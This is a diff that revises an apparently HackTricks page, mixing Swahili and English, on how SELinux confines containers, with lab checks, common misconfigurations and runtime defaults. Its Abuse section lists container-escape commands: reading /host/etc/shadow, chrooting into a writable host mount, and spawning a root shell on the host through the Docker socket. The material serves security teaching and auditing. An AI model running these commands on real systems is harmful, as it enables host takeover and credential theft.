@@ -2,26 +2,26 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Muhtasari
+## Overview
 
-SELinux ni **mfumo wa Udhibiti wa Upatikanaji wa Lazima unaotegemea lebo**. Kila mchakato na kitu kinachohusika kinaweza kubeba muktadha wa usalama, na sera huamua ni domain gani zinaweza kuingiliana na aina gani na kwa namna gani. Katika mazingira yenye container, hii kawaida ina maana kwamba runtime inaanzisha mchakato wa container chini ya domain iliyofungwa ya container na kuweka lebo kwenye yaliyomo ndani ya container kwa aina zinazofanana. Ikiwa sera inafanya kazi ipasavyo, mchakato unaweza kusoma na kuandika vitu ambavyo lebo yake inatarajiwa kugusa wakati ukikatizwa ufikivu kwa yaliyomo mengine kwenye host, hata kama yale yaliyomo yanakuwa yanaonekana kupitia mount.
+SELinux ni mfumo wa **udhibiti wa lazima wa ufikiaji unaotegemea lebo**. Kila mchakato au kitu kinachohusiana kinaweza kubeba muktadha wa usalama, na sera huamua ni domain gani zinaweza kuingiliana na aina gani na kwa njia gani. Katika mazingira yaliyo containerized, hii kwa kawaida inamaanisha kwamba runtime inaanzisha mchakato la container chini ya domain iliyofungwa ya container na kupeleka lebo kwa yaliyomo ndani ya container kulingana na aina zao. Ikiwa sera inaenda vizuri, mchakato unaweza kusoma na kuandika vitu ambavyo lebo yake inatarajiwa kugusa huku ukikataliwa kupata yaliyomo mengine ya host, hata kama yaliyomo hayo yanapotokea yanavyoonekana kupitia mount.
 
-Hii ni mojawapo ya ulinzi wenye nguvu upande wa host unaopatikana katika utekelezaji wa container wa Linux mashuhuri. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na mazingira mengine yanayolenga SELinux. Katika mazingira hayo, mwakilishi ambaye anapuuzia SELinux mara nyingi atasahau kwa nini njia inayofanana na wazi ya kuathiri host kwa kweli imezuiwa.
+Hii ni mojawapo ya kinga zenye nguvu upande wa host zinazopatikana katika deployments za kawaida za Linux container. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na mazingira mengine yanayoelekeza SELinux. Katika mazingira hayo, mpitia ambaye anapuuzia SELinux mara nyingi atakuwa na uelewa usio sahihi kwa nini njia ambayo inafanana wazi ya kuweza kuvunja usalama wa host imezuiliwa.
 
-## AppArmor dhidi ya SELinux
+## AppArmor Vs SELinux
 
-Tofauti rahisi ya kiwango cha juu ni kwamba AppArmor ni ya kuzingatia path wakati SELinux ni **inayotegemea lebo**. Hiyo ina matokeo makubwa kwa usalama wa container. Sera inayotekelezwa kwa njia ya path inaweza kutenda tofauti ikiwa yaliyomo yale yale ya host yanapatikana chini ya path tofauti isiyotarajiwa. Sera inayotegemea lebo badala yake inauliza ni lebo gani ya kitu na domain ya mchakato inaweza kumfanyia nini. Hii haifanyi SELinux iwe rahisi, lakini inafanya iwe imara dhidi ya aina ya udanganyifu wa path ambayo watetezi mara nyingi huhangaishwa nayo katika mifumo inayotegemea AppArmor.
+Tofauti rahisi ya kiwango cha juu ni kwamba AppArmor ni inayotegemea njia (path-based) wakati SELinux ni **label-based**. Hii ina matokeo makubwa kwa usalama wa container. Sera zinayotegemea njia zinaweza kutenda tofauti ikiwa yaliyomo yale yale ya host yanapojitokeza chini ya njia ya mount isiyotarajiwa. Sera inayotegemea lebo badala yake inauliza lebo ya kitu ni ipi na domain ya mchakato inaweza kufanya nini kwa kitu hicho. Hii haifanya SELinux kuwa rahisi, lakini inaiifanya iwe imara dhidi ya aina ya dhana za udanganyifu wa njia ambazo walinda mara nyingine hupata kwa bahati mbaya kwenye mifumo inayotegemea AppArmor.
 
-Kwa kuwa mfano ni wa kutegemea lebo, namna ya kushughulikia volume za container na maamuzi ya kurelabel ni muhimu kwa usalama. Ikiwa runtime au msimamizi anabadilisha lebo kwa upana sana ili "make mounts work", mpaka wa sera uliokusudiwa kuzuia mzigo wa kazi unaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.
+Kwa kuwa modeli inaelekeza kwenye lebo, utunzaji wa volume za container na maamuzi ya kubadilisha lebo ni muhimu kwa usalama. Ikiwa runtime au operator watabadilisha lebo kwa upana kupita kiasi ili "make mounts work", mpaka wa sera uliotarajiwa kuwa unazuia mzigo wa kazi unaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.
 
-## Maabara
+## Lab
 
-Ili kuona ikiwa SELinux inafanya kazi kwenye mwenyeji:
+Ili kuona ikiwa SELinux imewezeshwa kwenye host:
 ```bash
 getenforce 2>/dev/null
 sestatus 2>/dev/null
 ```
-Kuchunguza lebo zilizopo kwenye mwenyeji:
+Ili kuchunguza lebo zilizopo kwenye mwenyeji:
 ```bash
 ps -eZ | head
 ls -Zd /var/lib/containers 2>/dev/null
@@ -32,25 +32,25 @@ Ili kulinganisha utekelezaji wa kawaida na ule ambapo uwekaji lebo umezimwa:
 podman run --rm fedora cat /proc/self/attr/current
 podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
 ```
-On an SELinux-enabled host, hii ni demonstration ya vitendo kwa sababu inaonyesha tofauti kati ya workload inayotekelezwa chini ya expected container domain na ile ambayo imeondolewa safu hiyo ya enforcement layer.
+On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.
 
 ## Runtime Usage
 
-Podman imepangwa vizuri zaidi na SELinux kwenye systems ambapo SELinux ni sehemu ya platform default. Rootless Podman pamoja na SELinux ni mojawapo ya misingi imara ya container kwa matumizi ya kawaida kwa sababu mchakato tayari haufungiwi haki za root upande wa host na bado umefungwa na MAC policy. Docker pia inaweza kutumia SELinux pale inapo supported, ingawa administrators wakati mwingine huizima ili kuepuka friction ya volume-labeling. CRI-O na OpenShift wanategemea sana SELinux kama sehemu ya hadithi yao ya container isolation. Kubernetes pia inaweza kuonyesha mipangilio inayohusiana na SELinux, lakini thamani yake inategemea ikiwa node OS kweli inaunga mkono na kutekeleza SELinux.
+Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.
 
-Somo linalorudiwa ni kwamba SELinux sio garnish ya hiari. Katika ecosystems zilizojengwa kuzunguka SELinux, ni sehemu ya expected security boundary.
+The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.
 
 ## Misconfigurations
 
-Kosa la jadi ni `label=disable`. Kwa uendeshaji, mara nyingi hii hutokea kwa sababu volume mount ilikanushwa na jibu la muda mfupi la haraka lilikuwa kuondoa SELinux badala ya kurekebisha modeli ya labeling. Kosa lingine la kawaida ni relabeling isiyo sahihi ya maudhui ya host. Operesheni pana za relabel zinaweza kufanya application ifanye kazi, lakini pia zinaweza kupanua kile container inaruhusiwa kugusa zaidi ya kilichokusudiwa awali.
+The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.
 
-Ni muhimu pia kutochanganya **imewekwa** SELinux na **inayotumika** SELinux. Host inaweza kuunga SELinux na bado kuwa katika permissive mode, au runtime inaweza isiweke workload chini ya domain inayotarajiwa. Katika hali hizo ulinzi ni dhaifu zaidi kuliko maelezo yanavyoweza kupendekeza.
+It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.
 
 ## Abuse
 
-Wakati SELinux haipo, iko permissive, au imezima kwa kiasi kikubwa kwa workload, njia zilizo mounted kwenye host zinakuwa rahisi zaidi kwa matumizi mabaya. Hiyo bind mount ambayo vingine ingekuwa imezuiliwa na labels inaweza kuwa njia ya moja kwa moja ya kupata data za host au kufanya mabadiliko kwenye host. Hii ni muhimu hasa ikiwa imechanganywa na writable volume mounts, container runtime directories, au shortcuts za uendeshaji ambazo zilifunua sensitive host paths kwa urahisi.
+When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.
 
-SELinux mara nyingi inaelezea kwa nini generic breakout writeup inafanya kazi mara moja kwenye host moja lakini inashindwa mara kwa mara kwenye nyingine ingawa runtime flags zinaonekana sawa. Kiambato kilichokosekana mara nyingi si namespace au capability kabisa, bali label boundary ambayo ilibaki intact.
+SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.
 
 The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
 ```bash
@@ -59,52 +59,52 @@ cat /proc/self/attr/current
 find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
 find /host -maxdepth 2 -ls 2>/dev/null | head
 ```
-Ikiwa host bind mount ipo na SELinux labeling imezimwa au kudhoofishwa, uvujaji wa taarifa mara nyingi hutokea kwanza:
+Ikiwa host bind mount ipo na uwekaji lebo wa SELinux umezimwa au kudhoofishwa, ufichuzi wa taarifa mara nyingi hutokea kwanza:
 ```bash
 ls -la /host/etc 2>/dev/null | head
 cat /host/etc/passwd 2>/dev/null | head
 cat /host/etc/shadow 2>/dev/null | head
 ```
-Ikiwa mount inaweza kuandikwa na container kwa ufanisi ni host-root kutoka mtazamo wa kernel, hatua inayofuata ni kujaribu mabadiliko ya host yaliyo chini ya udhibiti badala ya kubahatisha:
+Ikiwa mount ni writable na container kwa ufanisi ni host-root kwa mtazamo wa kernel, hatua inayofuata ni kujaribu mabadiliko ya host yaliyodhibitiwa badala ya kubahatisha:
 ```bash
 touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
 ls -l /host/tmp/selinux_test 2>/dev/null
 ```
-Kwenye SELinux-capable hosts, kupoteza lebo karibu na direktori za hali ya runtime pia kunaweza kufichua njia za moja kwa moja za privilege-escalation:
+Kwenye mahosti zenye SELinux, kupoteza lebo karibu na saraka za hali ya runtime kunaweza pia kufichua njia za moja kwa moja za privilege-escalation:
 ```bash
 find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
 find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
 ```
-Amri hizi hazibadilishi full escape chain, lakini zinaonyesha haraka kama SELinux ndiyo iliyokuwa ikizuia upatikanaji wa data za host au uhariri wa faili upande wa host.
+Amri hizi hazibadilishi full escape chain, lakini zinafanya iwe wazi haraka kama SELinux ndiyo ilikuwa ikizuia host data access au host-side file modification.
 
-### Mfano Kamili: SELinux Imezimwa + Mount ya Host Inayoweza Kuandikwa
+### Mfano Kamili: SELinux Disabled + Writable Host Mount
 
-Ikiwa SELinux labeling imezimwa na filesystem ya host imewekwa writable katika `/host`, full host escape inageuka kuwa kesi ya kawaida ya bind-mount abuse:
+Ikiwa SELinux labeling imezimwa na host filesystem ime-mount writable kwenye `/host`, full host escape inakuwa kesi ya kawaida ya bind-mount abuse:
 ```bash
 getenforce 2>/dev/null
 cat /proc/self/attr/current
 touch /host/tmp/selinux_escape_test
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Ikiwa `chroot` inafanikiwa, mchakato wa container sasa unafanya kazi kutoka kwenye host filesystem:
+Ikiwa `chroot` itafanikiwa, mchakato wa container sasa unafanya kazi kutoka kwenye filesystem ya host:
 ```bash
 id
 hostname
 cat /etc/passwd | tail
 ```
-### Mfano Kamili: SELinux Disabled + Runtime Directory
+### Mfano Kamili: SELinux Imezimwa + Runtime Directory
 
-Ikiwa workload inaweza kufikia runtime socket mara labels zitakapozimwa, escape inaweza kuhamishwa kwa runtime:
+Ikiwa workload inaweza kufikia runtime socket mara labels zitakapozimwa, escape inaweza kupelekwa kwa runtime:
 ```bash
 find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
 docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 ```
-Taarifa muhimu ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya host-path au runtime-state access.
+Uchunguzi muhimu ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya ufikiaji wa host-path au runtime-state.
 
-## Checks
+## Ukaguzi
 
-Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kubaini muktadha wa usalama wa sasa, na kuona ikiwa faili au njia unazozijali kwa kweli zimetengwa kwa lebo.
+Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kutambua muktadha wa usalama wa sasa, na kuona kama faili au paths unazozijali kwa kweli zimetengwa kwa lebo.
 ```bash
 getenforce                              # Enforcing / Permissive / Disabled
 ps -eZ | grep -i container              # Process labels for container-related processes
@@ -113,19 +113,20 @@ cat /proc/self/attr/current             # Current process security context
 ```
 What is interesting here:
 
-- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
-- Ikiwa muktadha wa mchakato uliopo unaonekana usiotarajiwa au pana sana, workload huenda isifanye kazi chini ya sera ya container iliyokusudiwa.
-- Ikiwa faili zilizowekwa kwenye host au saraka za runtime zina labels ambazo mchakato unaweza kuzifikia kwa uhuru mwingi, bind mounts zinakuwa hatari zaidi.
+- `getenforce` inapaswa kurejea `Enforcing`; `Permissive` au `Disabled` hubadilisha maana ya sehemu yote ya SELinux.
+- Ikiwa muktadha wa mchakato wa sasa unaonekana usiotarajiwa au mpana sana, workload inaweza kuwa haifanyi kazi chini ya sera ya container iliyokusudiwa.
+- Ikiwa faili zilizowekwa kwenye host au runtime directories zina lebo ambazo mchakato unaweza kuzifikia kwa urahisi sana, bind mounts zinakuwa hatari zaidi.
 
-Unapokagua container kwenye jukwaa lenye uwezo wa SELinux, usichukulie uwekaji wa lebo kama jambo la pili. Katika kesi nyingi ni mojawapo ya sababu kuu kwanini host haijaathiriwa.
+When reviewing a container on an SELinux-capable platform, do not treat labeling as a secondary detail. In many cases it is one of the main reasons the host is not already compromised.
 
 ## Runtime Defaults
 
 | Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
-| Docker Engine | Inategemea host | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, kurelabel kwa upana kwa bind mounts, `--privileged` |
-| Podman | Kwa kawaida imewezeshwa kwenye host zenye SELinux | Kutengwa kwa SELinux ni sehemu ya kawaida ya Podman kwenye mifumo yenye SELinux isipokuwa ikizimwa | `--security-opt label=disable`, `label=false` katika `containers.conf`, `--privileged` |
-| Kubernetes | Hauwekwi moja kwa moja kwa kawaida kwenye ngazi ya Pod | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | `seLinuxOptions` dhaifu au pana, kukimbia kwenye node zilizo permissive/disabled, sera za jukwaa zinazozima uwekaji wa lebo |
-| CRI-O / OpenShift style deployments | Mara nyingi hutegemewa sana | SELinux is often a core part of the node isolation model in these environments | sera za kawaida zinazopanua sana upatikanaji, kuzima uwekaji wa lebo kwa ajili ya compatibility |
+| Docker Engine | Inategemea host | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
+| Podman | Kwa kawaida imewezeshwa kwenye SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
+| Kubernetes | Kwa ujumla haijiwekwa moja kwa moja katika ngazi ya Pod | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
+| CRI-O / OpenShift style deployments | Mara nyingi hutegemewa sana | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |
 
 SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
+{{#include ../../../../banners/hacktricks-training.md}}
